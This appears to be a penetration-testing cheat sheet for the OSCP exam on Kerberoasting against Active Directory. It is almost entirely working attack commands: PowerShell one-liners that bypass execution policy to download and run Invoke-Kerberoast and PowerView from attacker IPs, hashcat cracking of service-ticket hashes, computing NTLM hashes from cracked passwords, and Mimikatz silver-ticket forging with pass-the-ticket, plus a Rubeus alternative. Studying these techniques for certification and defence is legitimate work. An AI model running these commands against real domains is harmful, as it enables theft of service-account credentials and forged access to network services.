<div id="top"></div>

  <h3 align="center">Kerberoasting</h3>

  <p align="center">
    Kerberoasting for OSCP exam
  </p>
</div>

<!-- ABOUT THE PROJECT -->
## General
<h4>Finding SPNs</h4>

On compromised Windows machine:

    powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://192.168.119.216/Invoke-Kerberoast.ps1'))
    Invoke-Kerberoast -OutputFormat Hashcat

If this doesn't work we can try to download Invoke-Kerberoast.ps1 from attacker machine and import it.

    Import-Module .\Invoke-Kerberoast.ps1

Or oneliner:

    powershell -exec bypas -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.238:8000/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat|Select-Object -ExpandProperty hash |out-file -Encoding ASCII kerb-hash.txt" 

The hash comming out of this needs to be formatted with Codium or any other code tool. Then we can use it with Hashcat to crack it:

    hashcat -m 13100 hash_crackable /usr/share/wordlists/rockyou.txt
    
To show password:

    hashcat -m 13100 hash_crackable /usr/share/wordlists/rockyou.txt --show
    
Also see: https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/

Using PowerView:

    powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘http://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1’);Get-NetUser -SPN”
    
    Get-NetDomain #Basic domain info
    Get-NetUser -PreauthNotRequired #ASREPRoastable users
    Get-NetUser -SPN #Kerberoastable users
    
Manually (only if required):

Get SPNs:

    GetUserSPNs.ps1

Put ticket in memory:

    Add-Type -AssemblyName System.IdentityModel 
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com' 
    
Silver ticket (https://www.youtube.com/watch?v=GTJyd-AMfuM):

First we need to generate a NTLM hash from the cracked service account password:

    Install-Module DSInternals -Force 
    Import-Module DSInternals 
    $pwd = ConvertTo-SecureString 'P@ssword' -AsPlainText –Force 
    ConvertTo-NTHash $pwd 
    
Or in bash:
    iconv -f ASCII -t UTF-16LE <(printf "lolwut") | openssl dgst -md4
    
Create silver ticket (is called golden...):

Removing all tickets (fresh start):

    kerberos::purge (remove existing tickets) 

Create the silver ticket:

    kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt 

How do I get those values?:

* Sid:

      whoami /user

* Target (service account we are attacking) 
* Service (service it is running, just view SPN) 
* User (currentaccount user) 
* Rc4 is the password hash of the service account in IIS (see DSInternals above)
* /ppt (save ticket directly into memory) 

See if it worked:

    kerberos::list 
    
Alternatives to Mimikatz and Invoke-Kerberoast:
* Rubeus: https://github.com/GhostPack/Rubeus
    .\Rubeus.exe kerberoast /simple /outfile:hashes.txt

<p align="right">(<a href="#top">back to top</a>)</p>
